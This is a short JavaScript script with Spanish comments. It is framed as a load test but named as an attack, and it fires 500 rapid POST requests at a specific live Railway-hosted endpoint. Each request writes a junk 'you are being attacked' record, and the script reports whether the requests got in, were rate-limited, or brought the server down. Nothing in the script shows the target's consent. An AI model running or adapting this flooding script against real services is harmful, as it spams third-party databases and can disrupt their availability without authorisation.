const URL_OBJETIVO = 'https://cruninsano-production.up.railway.app/registros';

async function iniciarAtaque() {
    console.clear();
    console.log(`%c🚀 INICIANDO PRUEBA DE CARGA CONTRA: ${URL_OBJETIVO}`, "color: yellow; font-size: 14px; font-weight: bold;");

    // Lanzamos 20 peticiones rápidas
    for (let i = 1; i <= 500; i++) {
        fetch(URL_OBJETIVO, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            // 👇 AQUÍ ESTÁ EL CAMBIO IMPORTANTE: Usamos "registro"
            body: JSON.stringify({ 
                registro: `ESTAS SIENDO ATACADO CON PETICION #${i}` 
            }) 
        })
        .then(res => {
            if (res.ok) {
                console.log(`%c✅ Impacto #${i}: ÉXITO (Código ${res.status}) - ¡Entró!`, "color: green; font-weight: bold");
            } else if (res.status === 429) {
                console.log(`%c🛡️ Impacto #${i}: REBOTADO (Su Rate Limit funciona)`, "color: orange; font-weight: bold");
            } else {
                console.error(`❌ Impacto #${i}: FALLÓ (Código ${res.status})`);
            }
        })
        .catch(err => console.error("💀 El servidor no responde (posible caída):", err));
        
        // Pausa de 50ms entre disparos
        await new Promise(r => setTimeout(r, 50));
    }
}